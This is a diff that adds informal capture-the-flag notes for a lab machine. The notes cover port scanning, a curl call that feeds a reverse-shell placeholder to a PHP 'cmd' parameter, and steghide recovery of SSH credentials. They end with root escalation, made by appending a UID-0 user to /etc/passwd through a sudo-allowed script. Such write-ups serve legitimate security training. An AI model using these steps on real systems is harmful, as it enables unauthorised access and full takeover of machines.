@@ -1,0 +1,86 @@
+export IP=ip
+
+nmap scan
+nmap $IP -v -oN nmap.log -A
+
+port 22, 80
+
+
+gobuster scan
+/assets - 301 status code
+- no useful info
+
+with added .html,.php extension also no use
+
+(from next time we need to be sure about 
+
+-> from cookies we can confirm that backend is written in php
+
+-> some enumeration about it gives a simple cmd parameter that executes system commands -> now get a reverse shell with it
+
+curl -s "http://$IP:80/assets/index.php" -G --data-urlencode 'cmd=<revShellCommand>
+
+
+
+nikto scan
+nikto -h $IP -p 80
+-> no use
+
+enum4linux scan -> failed
+
+
+
+
+===
+once we get reverse shell -> as mentioned search the directory
+-> images folder has one unused image -> get it
+-> Hidden_Content folder contains on file -> get it to and check what these contents are
+
+
+-> the text might be password for this image decoding
+
+
+
+-> one the file -> it doesnt open -> check if the file magic numbers and check the file extensions whether this is correct or not.
+
+using steghide tool to extract information from images
+cmd: steghide extract -sf <imagePath>
+
+error pops up -> file is not supported,
+check image extension which is supported by steghide
+now check magic numbers of the file -> seems this is png file -> now change the magic numbers to jpg with hexeditor tool
+
+now once this is done -> extract info using steghide tool
+-> we can see it created a new file "creds.txt" -> contains username and password -> ssh into the machine with these creds
+
+
+-> once logged in cat user.txt and get the flag for question1
+
+
+-> now privelege escalation thingss
+-> check "sudo -l"
+[sudo] password for deku: 
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+
+
+-> check the file contents of this file and we can see that its not checkinf ro ">" or "/" special characters 
+-> check file permissions for /etc/passwd -> user can modify the file
+-> create a new user with gid as same as root 
+cmd: mkpasswd -m md5crypt <password> => say output is ###
+
+the line to be in /etc/passwd file will be 
+-> newUser:###:0:0:newUser:/root:/bin/bash ==> <line>
+
+
+-> now run the script feedback.sh with sudo and enter the line 
+'<line>' >> /etc/passwd
+
+-> we can see that its executed successfully
+-> now change use to newUser with new <password>
+
+-> we have root access now.....
